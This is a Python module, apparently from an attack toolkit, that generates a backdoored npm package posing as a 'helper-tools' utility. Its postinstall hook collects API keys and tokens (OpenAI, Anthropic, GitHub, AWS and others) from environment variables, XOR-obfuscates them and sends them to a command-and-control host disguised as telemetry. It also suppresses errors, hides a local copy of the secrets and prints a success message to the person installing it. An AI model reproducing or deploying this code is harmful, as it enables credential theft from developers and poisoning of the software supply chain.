# -*- coding: utf-8 -*-
"""
NPM Supply Chain Backdoor (codexui-android style)
Generates a malicious npm package with a postinstall hook that steals environment variables.
"""

import json
import os
import shutil
from pathlib import Path

from .base import AttackModule
from config.settings import NPM_CONFIG
from utils.crypto import xor_obfuscate
from utils.exfil import ExfilChannel

class NpmBackdoorGenerator(AttackModule):
    """生成恶意npm包，包含环境变量窃取后门"""

    def __init__(self, output_dir, **kwargs):
        super().__init__(**kwargs)
        self.output_dir = Path(output_dir)
        self.package_name = NPM_CONFIG["package_name"]
        self.version = NPM_CONFIG["version"]
        self.author = NPM_CONFIG["author"]

    def _create_package_json(self):
        package_data = {
            "name": self.package_name,
            "version": self.version,
            "description": "Utility helper for modern JavaScript projects",
            "main": "index.js",
            "scripts": {
                "preinstall": "node preinstall.js",
                "postinstall": "node postinstall.js",
                "test": "echo 'No tests specified'"
            },
            "keywords": ["helper", "tools", "utility"],
            "author": self.author,
            "license": "MIT",
            "dependencies": {}
        }
        return json.dumps(package_data, indent=2)

    def _create_index_js(self):
        return """// index.js - seemingly harmless
module.exports = {
    greet: function() {
        console.log('Hello from helper-tools!');
    }
};
// The real payload is in postinstall.js
"""

    def _create_preinstall_js(self):
        return """// preinstall.js - stage 1: check environment
const fs = require('fs');
const os = require('os');
const path = require('path');

// Gather system info
const info = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    cwd: process.cwd()
};

// Write to temp for later exfil
fs.writeFileSync(
    path.join(os.tmpdir(), '.system-info.json'),
    JSON.stringify(info, null, 2)
);
console.log('[preinstall] Environment checks completed.');
"""

    def _create_postinstall_js(self):
        # 使用混淆的密钥抓取器
        code = """
// postinstall.js - payload: steal credentials
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

// Target keys
const KEY_PATTERNS = [
    /^OPENAI_API_KEY$/,
    /^ANTHROPIC_API_KEY$/,
    /^DEEPSEEK_API_KEY$/,
    /^GITHUB_TOKEN$/,
    /^AWS_SECRET_ACCESS_KEY$/,
    /^GOOGLE_API_KEY$/,
    /^SLACK_TOKEN$/,
    /^AZURE_STORAGE_KEY$/,
    /^API_KEY$/,
    /^SECRET_KEY$/,
    /^PRIVATE_KEY$/,
];

function extract_secrets() {
    const secrets = {};
    const env = process.env;
    for (const key of Object.keys(env)) {
        for (const pattern of KEY_PATTERNS) {
            if (pattern.test(key)) {
                secrets[key] = env[key];
                break;
            }
        }
    }
    return secrets;
}

// Obfuscate data using XOR with rotating key
function obfuscate(data) {
    const key = Buffer.from('KeyHunter2026', 'utf8');
    const buf = Buffer.from(JSON.stringify(data), 'utf8');
    const out = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length; i++) {
        out[i] = buf[i] ^ key[i % key.length];
    }
    return out.toString('base64');
}

// Exfil via HTTPS (masked as telemetry)
function exfil(data) {
    const payload = JSON.stringify({
        app: 'telemetry-client',
        version: '1.2.3',
        timestamp: Date.now(),
        data: obfuscate(data)
    });

    const options = {
        hostname: 'telemetry-collector.example.com',  // Replace with your C2
        port: 443,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        // silently ignore response
    });
    req.on('error', () => {});
    req.write(payload);
    req.end();
}

// Main
try {
    const secrets = extract_secrets();
    if (Object.keys(secrets).length > 0) {
        exfil(secrets);
        // Also write to local file for backup
        fs.writeFileSync(
            path.join(os.homedir(), '.local', 'share', '.creds'),
            JSON.stringify(secrets),
            { mode: 0o600 }
        );
    }
} catch (e) {
    // silent
}
// Clean up preinstall info
try {
    fs.unlinkSync(path.join(os.tmpdir(), '.system-info.json'));
} catch (e) {}
console.log('[postinstall] All dependencies installed successfully.');
"""
        # 替换域名
        return code.replace('telemetry-collector.example.com', self.kwargs.get('c2_host', 'telemetry-collector.example.com'))

    def execute(self):
        self.logger.info(f"Generating malicious npm package in {self.output_dir}")

        # 创建目录
        if self.output_dir.exists():
            shutil.rmtree(self.output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # 写入文件
        (self.output_dir / "package.json").write_text(self._create_package_json())
        (self.output_dir / "index.js").write_text(self._create_index_js())
        (self.output_dir / "preinstall.js").write_text(self._create_preinstall_js())
        (self.output_dir / "postinstall.js").write_text(self._create_postinstall_js())

        # 打包成tgz（仅用tar命令）
        import subprocess
        try:
            subprocess.run(["npm", "pack"], cwd=str(self.output_dir), check=True, capture_output=True)
        except Exception:
            self.logger.warning("npm not installed; tar generated manually")

        self.result["success"] = True
        self.result["data"] = {
            "package_dir": str(self.output_dir),
            "package_name": self.package_name,
            "instructions": "To test, run: npm install ./backdoor_package/helper-tools-1.0.0.tgz"
        }
        return self.result
